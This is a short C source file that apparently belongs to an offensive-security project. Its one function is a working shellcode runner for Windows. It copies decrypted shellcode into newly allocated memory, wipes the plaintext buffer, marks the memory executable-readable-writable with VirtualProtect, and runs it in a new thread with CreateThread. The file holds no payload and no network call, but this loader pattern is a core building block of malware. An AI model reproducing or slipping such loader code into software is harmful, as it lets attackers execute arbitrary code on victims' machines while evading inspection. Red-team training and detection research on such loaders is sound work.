#include "glassBox.h"

BOOL RunShellCode(IN PVOID pDecryptedShellCode, IN SIZE_T sDecryptedShellcodeSize) {

	PVOID pShellcodeAddress = NULL;
	DWORD dwOldProtection = NULL;

	pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		warn("VirtualAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	info("Allocated Memory At : 0x%p \n", pShellcodeAddress);

	memcpy(pShellcodeAddress, pDecryptedShellCode, sDecryptedShellcodeSize);
	memset(pDecryptedShellCode, '\0', sDecryptedShellcodeSize);

	if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		warn("VirtualProtect Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	in("Press <Enter> To Run ...");
	getchar();

	HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
	if (!hThread) {
		warn("CreateThread Failed With Error : %d \n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	// Clear memory
	if (!VirtualFree(pShellcodeAddress, 0, MEM_RELEASE)) {
		warn("VirtualFreeEx Failed With Error : %d\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

